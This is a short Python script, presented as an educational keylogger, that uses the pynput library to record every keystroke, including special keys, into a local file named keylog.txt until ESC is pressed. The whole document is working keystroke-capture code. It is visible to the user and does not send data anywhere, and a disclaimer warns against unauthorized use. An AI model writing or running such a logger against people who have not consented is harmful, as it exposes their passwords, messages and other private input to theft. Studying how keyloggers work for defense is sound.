"""
Simple Keylogger for Educational Purposes
Note: This code is for educational purposes only. Using keyloggers without 
proper authorization is illegal and unethical.
"""

from pynput import keyboard
import time
import os

# The file to log keys to
log_file = "keylog.txt"

def on_press(key):
    """Function that runs when a key is pressed"""
    try:
        with open(log_file, "a") as f:
            # Handle regular character keys
            if hasattr(key, 'char') and key.char is not None:
                f.write(str(key.char))
            # Handle special keys
            elif key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            else:
                # For any other special key, write its name
                f.write(f'[{str(key).replace("Key.", "")}]')
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """Function that runs when a key is released"""
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Start the keylogger"""
    print("Keylogger started. Press ESC to stop.")
    # Create empty log file or clear existing one
    with open(log_file, "w") as f:
        f.write(f"Keylogger started at {time.ctime()}\n")
    
    # Start listening for keyboard input
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print(f"Keylogger stopped. Data saved to {os.path.abspath(log_file)}")

if __name__ == "__main__":
    start_keylogger()